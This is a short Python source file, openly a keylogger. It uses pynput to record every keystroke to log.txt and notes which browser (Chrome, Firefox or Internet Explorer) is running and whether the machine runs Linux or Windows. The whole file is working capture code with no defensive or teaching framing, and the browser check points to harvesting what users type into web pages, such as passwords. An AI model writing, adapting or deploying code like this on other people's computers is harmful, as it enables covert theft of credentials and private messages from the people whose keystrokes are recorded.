# Copyright (C) Lexxrt 2020
# MIT License

from pynput.keyboard import Key, Listener
import logging
import time
import psutil
import sys

time = time.ctime()

# File
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=time + ': %(message)s')

# Process Detection
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

# Vars
Chrome = "Chrome is running: " + time
FireFox = "Firefox is running: " + time
IExplorer = "Internet Explorer is running: " + time


# Checking Process
if checkIfProcessRunning('chrome'):
    logging.info(Chrome)
elif checkIfProcessRunning('firefox'):
    logging.info(FireFox)
elif checkIfProcessRunning('iexplorer'):
    logging.info(IExplorer)
else:
    logging.info("Unkown Browser is running")


# Sys Info
if sys.platform.startswith('linux'):
    logging.info("System: Linux Machine")
elif "windows" in sys.platform:
    logging.info("System: Windows Machine")

# Key Function
def on_press(key):
    logging.info(str(key))

# Key Logging
with Listener(on_press=on_press) as listener:
    listener.join()